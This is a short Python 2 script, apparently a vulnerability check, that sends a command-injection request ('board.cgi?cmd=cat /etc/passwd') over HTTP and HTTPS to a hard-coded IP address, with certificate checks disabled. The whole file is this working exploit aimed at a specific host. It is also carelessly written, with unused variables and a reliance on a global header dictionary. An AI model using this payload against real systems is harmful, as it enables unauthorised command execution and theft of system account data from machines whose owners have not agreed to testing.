# !/usr/bin/env python
# -*- coding:utf-8 -*-


import requests


def check_vul(**data):
    useragent = ''
    if 'url' in data.keys() and 'hostname' in data.keys():
        httpurl = 'http://'+data['hostname'] + data['url']
        httpsurl = 'https://'+data['hostname'] + data['url']
    else:
        return 'no hostname or url'
    if 'method' in data.keys():
        if data['method'].lower() == 'get':
            # get 方式进行验证
            http_content = requests.get(httpurl, headers = headers)
            https_content = requests.get(httpsurl, headers = headers, verify = False)
            print http_content
            print https_content

    pass


if __name__ == '__main__':
    header = headers = {'user-agent': 'my-app/0.0.1'}
    url = '/board.cgi?cmd=cat%20/etc/passwd'
    hostname = '114.113.67.49'
    port = ''
    postdata = ''
    method = 'GET'
    check_vul(url = url, hostname = hostname, port = port, postdata = postdata, header = header, method = method )